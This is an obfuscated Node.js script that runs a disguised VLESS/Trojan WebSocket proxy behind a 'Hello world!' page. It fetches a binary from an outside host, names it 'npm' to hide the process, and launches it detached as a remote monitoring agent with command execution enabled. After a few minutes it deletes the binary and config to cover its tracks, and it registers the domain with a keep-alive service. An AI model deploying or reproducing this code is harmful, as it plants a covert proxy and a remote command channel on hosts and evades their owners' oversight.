const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||'be7abf05-71cd-4ffb-87cc-549bb173bd4b',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'20031125',NAME=process['env']['NAME']||'Hug',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const r=await axios['get']('https://speed.cloudflare.com/meta'),j=r['data'];ISP=(j['country']+'-'+j['asOrganization'])['replace'](/ /g,'_');}catch(x){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((r,j)=>{if(r['url']==='/'){const x=path['join'](__dirname,'index.html');fs['readFile'](x,'utf8',(u,J)=>{if(u){j['writeHead'](0xc8,{'Content-Type':'text/html'}),j['end']('Hello\x20world!');return;}j['writeHead'](0xc8,{'Content-Type':'text/html'}),j['end'](J);});return;}else{if(r['url']==='/'+SUB_PATH){const u='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,J='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,k=u+'\x0a'+J,W=Buffer['from'](k)['toString']('base64');j['writeHead'](0xc8,{'Content-Type':'text/plain'}),j['end'](W+'\x0a');}else j['writeHead'](0x194,{'Content-Type':'text/plain'}),j['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(r){return new Promise((j,x)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](r)){j(r);return;}let u=0x0;function J(){if(u>=DNS_SERVERS['length']){x(new Error('Failed\x20to\x20resolve\x20'+r+'\x20with\x20all\x20DNS\x20servers'));return;}const k=DNS_SERVERS[u];u++;const W='https://dns.google/resolve?name='+encodeURIComponent(r)+'&type=A';axios['get'](W,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](G=>{const L=G['data'];if(L['Status']===0x0&&L['Answer']&&L['Answer']['length']>0x0){const f=L['Answer']['find'](o=>o['type']===0x1);if(f){j(f['data']);return;}}J();})['catch'](G=>{J();});}J();});}function handleVlessConnection(r,j){const [x]=j,u=j['slice'](0x1,0x11);if(!u['every']((f,o)=>f==parseInt(uuid['substr'](o*0x2,0x2),0x10)))return![];let J=j['slice'](0x11,0x12)['readUInt8']()+0x13;const k=j['slice'](J,J+=0x2)['readUInt16BE'](0x0),W=j['slice'](J,J+=0x1)['readUInt8'](),G=W==0x1?j['slice'](J,J+=0x4)['join']('.'):W==0x2?new TextDecoder()['decode'](j['slice'](J+0x1,J+=0x1+j['slice'](J,J+0x1)['readUInt8']())):W==0x3?j['slice'](J,J+=0x10)['reduce']((f,o,A,C)=>A%0x2?f['concat'](C['slice'](A-0x1,A+0x1)):f,[])['map'](f=>f['readUInt16BE'](0x0)['toString'](0x10))['join'](':'):'';r['send'](new Uint8Array([x,0x0]));const L=createWebSocketStream(r);return resolveHost(G)['then'](f=>{net['connect']({'host':f,'port':k},function(){this['write'](j['slice'](J)),L['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](L);})['on']('error',()=>{});})['catch'](f=>{net['connect']({'host':G,'port':k},function(){this['write'](j['slice'](J)),L['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](L);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(r,j){try{if(j['length']<0x3a)return![];const x=j['slice'](0x0,0x38)['toString'](),u=[UUID];let J=null;for(const A of u){const C=crypto['createHash']('sha224')['update'](A)['digest']('hex');if(C===x){J=A;break;}}if(!J)return![];let k=0x38;j[k]===0xd&&j[k+0x1]===0xa&&(k+=0x2);const W=j[k];if(W!==0x1)return![];k+=0x1;const G=j[k];k+=0x1;let L,f;if(G===0x1)L=j['slice'](k,k+0x4)['join']('.'),k+=0x4;else{if(G===0x3){const Q=j[k];k+=0x1,L=j['slice'](k,k+Q)['toString'](),k+=Q;}else{if(G===0x4)L=j['slice'](k,k+0x10)['reduce']((S,F,c,H)=>c%0x2?S['concat'](H['slice'](c-0x1,c+0x1)):S,[])['map'](S=>S['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),k+=0x10;else return![];}}f=j['readUInt16BE'](k),k+=0x2;k<j['length']&&j[k]===0xd&&j[k+0x1]===0xa&&(k+=0x2);const o=createWebSocketStream(r);return resolveHost(L)['then'](S=>{net['connect']({'host':S,'port':f},function(){k<j['length']&&this['write'](j['slice'](k)),o['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](o);})['on']('error',()=>{});})['catch'](S=>{net['connect']({'host':L,'port':f},function(){k<j['length']&&this['write'](j['slice'](k)),o['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](o);})['on']('error',()=>{});}),!![];}catch(S){return![];}}wss['on']('connection',(r,j)=>{const x=j['url']||'';r['once']('message',u=>{if(u['length']>0x11&&u[0x0]===0x0){const J=u['slice'](0x1,0x11),k=J['every']((W,G)=>W==parseInt(uuid['substr'](G*0x2,0x2),0x10));if(k){!handleVlessConnection(r,u)&&r['close']();return;}}!handleTrojanConnection(r,u)&&r['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const r=os['arch']();return r==='arm'||r==='arm64'||r==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const r=getDownloadUrl(),j=await axios({'method':'get','url':r,'responseType':'stream'}),x=fs['createWriteStream']('npm');return j['data']['pipe'](x),new Promise((u,J)=>{x['on']('finish',()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',k=>{if(k)J(k);u();});}),x['on']('error',J);});}catch(u){throw u;}},runnz=async()=>{try{const x=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(x['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(u){}await downloadFile();let r='',j=['443','8443','2096','2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const J=j['includes'](NEZHA_PORT)?'--tls':'';r='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+J+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const k=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',W=j['includes'](k)?'true':'false',G='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+W+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',G);}r='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(r,{'shell':'/bin/bash'},L=>{if(L)console['error']('npm\x20running\x20error:',L);else console['log']('npm\x20is\x20running');});}catch(L){console['error']('error:\x20'+L);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN)return;const r='https://'+DOMAIN;try{const j=await axios['post']('https://oooo.serv00.net/add-url',{'url':r},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(x){}}const delFiles=()=>{fs['unlink']('npm',()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
